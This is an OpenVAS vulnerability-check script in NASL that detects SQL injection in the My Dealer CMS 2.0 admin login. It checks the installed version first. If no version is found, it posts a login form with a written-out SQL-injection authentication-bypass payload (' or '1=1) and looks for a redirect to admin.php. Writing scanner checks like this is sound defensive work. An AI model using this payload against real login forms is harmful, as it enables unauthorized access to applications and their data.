###############################################################################
# OpenVAS Vulnerability Test
# $Id: my_dealer_34464.nasl 9425 2018-04-10 12:38:38Z cfischer $
#
# My Dealer CMS 'admin/login.php' Multiple SQL Injection
# Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100139");
 script_version("$Revision: 9425 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-04-16 19:20:22 +0200 (Thu, 16 Apr 2009)");
 script_bugtraq_id(34464);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("My Dealer CMS 'admin/login.php' Multiple SQL Injection Vulnerabilities");

 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("my_dealer_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : "My Dealer CMS is prone to multiple SQL-injection vulnerabilities
 because it fails to sufficiently sanitize user-supplied data before
 using it in an SQL query.");
 script_tag(name : "impact" , value : "Exploiting these issues could allow an attacker to compromise the
 application, access or modify data, or exploit latent
 vulnerabilities in the underlying database.");
 script_tag(name : "affected" , value : "My Dealer CMS 2.0 is vulnerable; other versions may also be
 affected.");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34464");

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/mydealercms")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

vers = matches[1];
dir  = matches[2];

if(!isnull(vers) && vers >!< "unknown") {

  if(version_is_equal(version: vers, test_version: "2.0")) {
    VULN = TRUE;
  }  

} else {  
# No version found, try to exploit.
  if(!isnull(dir)) {
        variables = string("username=%27%20or%20%271=1&password=%27%20or%20%271");
        filename = string(dir + "/admin/process.php");
        host = http_host_name( port:port );

	    req = string(
	      "POST ", filename, " HTTP/1.0\r\n", 
	      "Referer: ","http://", host, filename, "\r\n",
	      "Host: ", host, "\r\n", 
	      "Content-Type: application/x-www-form-urlencoded\r\n", 
	      "Content-Length: ", strlen(variables), 
	      "\r\n\r\n", 
	      variables
	    );

       result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

       if( result == NULL )exit(0); 
       if(egrep(pattern:"Location: admin.php", string: result))
       {    
  	  VULN = TRUE;
       }
  }
}

if(VULN) {

  security_message(port:port);
  exit(0);

}  
exit(99);
